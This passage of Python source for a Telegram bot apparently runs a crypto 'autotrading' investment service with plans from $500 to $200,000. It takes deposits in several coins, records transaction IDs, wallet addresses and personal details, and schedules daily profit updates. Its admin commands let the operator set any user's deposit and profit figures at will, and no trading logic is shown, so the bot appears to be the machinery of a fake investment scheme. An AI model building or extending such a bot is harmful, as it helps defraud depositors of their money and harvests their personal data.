        [InlineKeyboardButton("DONE", callback_data="deposit_done"),
         InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    await update.callback_query.edit_message_text(
        text=text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def payment_callback_handler(update: Update, context: CallbackContext):
    data = update.callback_query.data
    if data in ("pay_btc", "pay_eth", "pay_bnb", "pay_sol", "pay_xrp"):
        await send_deposit_address(update, context)
    elif data == "pay_usdt":
        await usdt_network_menu(update, context)
    elif data.startswith("usdt_"):
        await send_deposit_address(update, context)
    elif data == "payment_method":
        await payment_method_menu(update, context)

async def deposit_done_callback(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in deposit_done_callback: %s", e)
        else:
            raise
    await update.callback_query.edit_message_text("Please enter your transaction ID:")
    return STATE_TXID

async def handle_txid(update: Update, context: CallbackContext):
    txid = update.message.text.strip()
    crypto = context.user_data.get("selected_crypto", "BTC")
    verified = await verify_txid_on_blockchain(txid, crypto, context)
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    if not verified:
        # if verification fails, still keep txid in user_data but let user retry
        await update.message.reply_text(get_msg(lang, "invalid_txid"))
        session.close()
        return STATE_TXID
    context.user_data["txid"] = txid
    plan = context.user_data.get("selected_plan")
    deposit_amount = {
        "plan_1": 500, "plan_2": 1000, "plan_3": 5000,
        "plan_4": 10000, "plan_5": 50000, "plan_6": 200000
    }.get(plan, 0)
    context.user_data["deposit"] = deposit_amount

    # update DB
    if user:
        user.selected_plan   = context.user_data.get("selected_plan")
        user.selected_crypto = context.user_data.get("selected_crypto")
        user.usdt_network    = context.user_data.get("usdt_network")
        user.txid            = txid
        user.deposit         = deposit_amount
    else:
        user = UserAccount(
            telegram_id     = update.effective_user.id,
            selected_plan   = context.user_data.get("selected_plan"),
            selected_crypto = context.user_data.get("selected_crypto"),
            usdt_network    = context.user_data.get("usdt_network"),
            txid            = txid,
            deposit         = deposit_amount,
            profit          = 0.0,
            wallet_address  = context.user_data.get("depositor_usdt_trc20"),
            language        = "en"
        )
        session.add(user)
    session.commit()
    session.close()

    text = get_msg(lang, "txid_received", txid=txid, amount=deposit_amount)
    kb = [
        [InlineKeyboardButton("YES", callback_data="confirm_yes"),
         InlineKeyboardButton("NO",  callback_data="confirm_no")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))
    return STATE_CONFIRM

async def confirm_deposit_callback(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in confirm_deposit_callback: %s", e)
        else:
            raise

    choice = update.callback_query.data
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"
    if choice == "confirm_yes":
        amt = context.user_data.get("deposit", 0)
        await update.callback_query.edit_message_text(get_msg(lang, "deposit_success", amount=amt))
        session.close()
        return STATE_WALLET
    else:
        await update.callback_query.edit_message_text("Please enter your transaction ID again:")
        session.close()
        return STATE_TXID

async def handle_wallet(update: Update, context: CallbackContext):
    wallet_address = update.message.text.strip()
    context.user_data["wallet_address"] = wallet_address
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.wallet_address  = wallet_address
    else:
        user = UserAccount(
            telegram_id     = update.effective_user.id,
            wallet_address  = wallet_address,
            language        = "en"
        )
        session.add(user)
    session.commit()
    session.close()
    await update.message.reply_text(get_msg(user.language if user else "en", "activated"))
    return ConversationHandler.END

async def cancel_deposit(update: Update, context: CallbackContext):
    await update.message.reply_text("Deposit process cancelled.")
    return ConversationHandler.END

async def balance_handler(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest as e:
        if "too old" in str(e):
            logger.warning("Expired callback in balance_handler: %s", e)
        else:
            raise
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    session.close()
    lang = user.language if user else "en"
    if user:
        d = user.deposit
        p = user.profit
        t = d + p
        text = f"Your current balance:\nDeposit: ${d:.2f}\nProfit: ${p:.2f}\nTotal: ${t:.2f}"
    else:
        text = "Balance: $0"
    kb = [[InlineKeyboardButton("BACK", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))

# ------------------------
# Admin tools: ads, set balance, override
# ------------------------
async def admin_ad(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return

    # If admin sends /ad <text>, broadcast text
    text = " ".join(context.args) if context.args else None
    session = get_session()
    users = session.query(UserAccount).all()
    count = 0
    for u in users:
        try:
            if text:
                await context.bot.send_message(chat_id=u.telegram_id, text=text)
            else:
                # if no text, check if admin replied to a message with media and we can forward it
                if update.message.reply_to_message:
                    await context.bot.forward_message(chat_id=u.telegram_id, from_chat_id=update.effective_chat.id, message_id=update.message.reply_to_message.message_id)
                else:
                    # nothing to send
                    continue
            count += 1
        except Exception as e:
            logger.debug("Failed to send ad to %s: %s", u.telegram_id, e)
    session.close()
    await update.message.reply_text(get_msg("en", "ad_broadcasted", count=count))

async def admin_setbalance(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return
    # syntax: /setbalance <user_telegram_id> <deposit> <profit>
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /setbalance <user_telegram_id> <deposit> [profit]")
        return
    try:
        user_id = int(context.args[0])
        deposit = float(context.args[1])
        profit = float(context.args[2]) if len(context.args) > 2 else 0.0
    except Exception:
        await update.message.reply_text("Invalid arguments.")
        return
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=user_id).first()
    if not user:
        await update.message.reply_text("User not found.")
        session.close()
        return
    user.deposit = deposit
    user.profit = profit
    session.commit()
    session.close()
    await update.message.reply_text(get_msg("en", "set_balance_ok", user_id=user_id))

async def admin_adddeposit(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return
    # syntax: /adddeposit <user_telegram_id> <amount>
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /adddeposit <user_telegram_id> <amount>")
        return
    try:
        user_id = int(context.args[0])
        amount = float(context.args[1])
    except Exception:
        await update.message.reply_text("Invalid arguments.")
        return
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=user_id).first()
    if not user:
        await update.message.reply_text("User not found.")
        session.close()
        return
    user.deposit += amount
    session.commit()
    session.close()
    await update.message.reply_text(f"Added ${amount:.2f} to user {user_id} deposit.")

async def admin_override_payment(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return
    # syntax: /overridepayment <user_telegram_id> <plan_key> [amount]
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /overridepayment <user_telegram_id> <plan_key> [amount]")
        return
    try:
        user_id = int(context.args[0])
        plan_key = context.args[1]
        amount = float(context.args[2]) if len(context.args) > 2 else None
    except Exception:
        await update.message.reply_text("Invalid arguments.")
        return
    if plan_key not in TRADING_PLANS:
        await update.message.reply_text("Invalid plan key.")
        return
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=user_id).first()
    if not user:
        await update.message.reply_text("User not found.")
        session.close()
        return
    user.selected_plan = plan_key
    if amount is not None:
        user.deposit = amount
    else:
        # default deposit per plan
        deposit_amount = {
            "plan_1": 500, "plan_2": 1000, "plan_3": 5000,
            "plan_4": 10000, "plan_5": 50000, "plan_6": 200000
        }.get(plan_key, 0)
        user.deposit = deposit_amount
    session.commit()
    session.close()
    await update.message.reply_text(get_msg("en", "override_ok", user_id=user_id))

async def admin_dashboard(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return
    session = get_session()
    users = session.query(UserAccount).all()
    total_users   = len(users)
    total_deposit = sum(u.deposit for u in users)
    total_profit  = sum(u.profit for u in users)
    session.close()
    await update.message.reply_text(get_msg("en", "admin_report",
                                             total_users=total_users,
                                             total_deposit=total_deposit,
                                             total_profit=total_profit))

# ------------------------
# Callback dispatcher
# ------------------------
async def callback_dispatcher(update: Update, context: CallbackContext):
    data = update.callback_query.data
    if data == "main_menu":
        await main_menu(update, context)
    elif data == "autotrading":
        await autotrading_menu(update, context)
    elif data == "payment_method":
        await payment_method_menu(update, context)
    elif data == "balance":
        await balance_handler(update, context)
    elif data.startswith("plan_"):
        await plan_selection(update, context)
    elif data.startswith("pay_") or data.startswith("usdt_"):
        await payment_callback_handler(update, context)
    elif data in ("deposit_done",):
        await deposit_done_callback(update, context)
    elif data in ("confirm_yes", "confirm_no"):
        await confirm_deposit_callback(update, context)
    elif data.startswith("lang_"):
        await set_language(update, context)
    elif data == "collect_details":
        await start_collect_details(update, context)
    else:
        try:
            await update.callback_query.answer(text="Option not handled.")
        except telegram.error.BadRequest as e:
            if "too old" in str(e):
                logger.warning("Expired callback in callback_dispatcher: %s", e)
            else:
                raise

# ------------------------
# Language Selection Handlers
# ------------------------
async def choose_language(update: Update, context: CallbackContext):
    kb = [
        [InlineKeyboardButton("English",   callback_data="lang_en"),
         InlineKeyboardButton("Español",   callback_data="lang_es")],
        [InlineKeyboardButton("Русский",   callback_data="lang_ru"),
         InlineKeyboardButton("العربية",  callback_data="lang_ar")],
        [InlineKeyboardButton("Bahasa Indonesia", callback_data="lang_id"),
         InlineKeyboardButton("Deutsch",   callback_data="lang_de")],
        [InlineKeyboardButton("हिन्दी",    callback_data="lang_hi"),
         InlineKeyboardButton("Français",  callback_data="lang_fr")],
        [InlineKeyboardButton("中文",      callback_data="lang_zh")]
    ]
    # use default English prompt for language selection
    if update.message:
        await update.message.reply_text(get_msg("en", "choose_language"), reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.callback_query.edit_message_text(get_msg("en", "choose_language"), reply_markup=InlineKeyboardMarkup(kb))

async def set_language(update: Update, context: CallbackContext):
    try:
        await update.callback_query.answer()
    except telegram.error.BadRequest:
        pass

    lang = update.callback_query.data.split("_")[1]
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.language = lang
    else:
        session.add(UserAccount(telegram_id=update.effective_user.id, language=lang))
    session.commit()
    session.close()

    # Immediately display welcome message with main menu using the selected language.
    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"),     callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    await update.callback_query.edit_message_text(get_msg(lang, "welcome"), reply_markup=InlineKeyboardMarkup(kb))

async def toggle_compound(update: Update, context: CallbackContext):
    session = get_session()
    user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    if user:
        user.compound = not user.compound
        session.commit()
        msg = get_msg(user.language, "compound_on") if user.compound else get_msg(user.language, "compound_off")
        await update.message.reply_text(msg)
    else:
        await update.message.reply_text(get_msg("en", "compound_off"))
    session.close()

# ------------------------
# Main: Build Application & Run via Webhook
# ------------------------

def main() -> None:
    port = int(os.environ.get("PORT", 8080))
    webhook_url = f"{WEBHOOK_BASE_URL}/{TGBOTTOKEN}"
    app_bot = Application.builder().token(TGBOTTOKEN).build()
    
    logger.info("🐳 Starting webhook server...")
    logger.info("Listening on port %s", port)
    logger.info("Webhook URL: %s", webhook_url)
    
    # Conversation handler for deposit TXID and wallet flow (existing)
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(deposit_done_callback, pattern="^deposit_done$")],
        states={
            STATE_TXID:   [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_txid)],
            STATE_CONFIRM:[CallbackQueryHandler(confirm_deposit_callback, pattern="^confirm_")],
            STATE_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet)],
        },
        fallbacks=[CommandHandler("cancel", cancel_deposit)],
        allow_reentry=True,
    )

    # Conversation handler for collecting depositor details
    details_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_collect_details, pattern="^collect_details$")],
        states={
            STATE_NAME:       [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_name)],
            STATE_EMAIL:      [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_email)],
            STATE_COUNTRY:    [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_country)],
            STATE_USDT_TRC20: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_usdt_trc20)],
        },
        fallbacks=[CommandHandler("cancel", cancel_deposit)],
        allow_reentry=True,
    )

    # Register handlers
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("language", choose_language))
    app_bot.add_handler(CommandHandler("compound", toggle_compound))
    app_bot.add_handler(CommandHandler("admin", admin_dashboard))
    app_bot.add_handler(CommandHandler("ad", admin_ad))
    app_bot.add_handler(CommandHandler("setbalance", admin_setbalance))
    app_bot.add_handler(CommandHandler("adddeposit", admin_adddeposit))
    app_bot.add_handler(CommandHandler("overridepayment", admin_override_payment))

    app_bot.add_handler(conv_handler)
    app_bot.add_handler(details_conv)

    app_bot.add_handler(CallbackQueryHandler(callback_dispatcher))
    app_bot.add_error_handler(error_handler)

     # schedule daily profit updates at UTC midnight
    job_time = datetime.time(hour=0, minute=0, second=0)
    app_bot.job_queue.run_daily(update_daily_profits, time=job_time)

    app_bot.run_webhook(
        listen   ="0.0.0.0",
        port     = port,
        url_path = TGBOTTOKEN,
        webhook_url = webhook_url
    )

if __name__ == "__main__":
    main()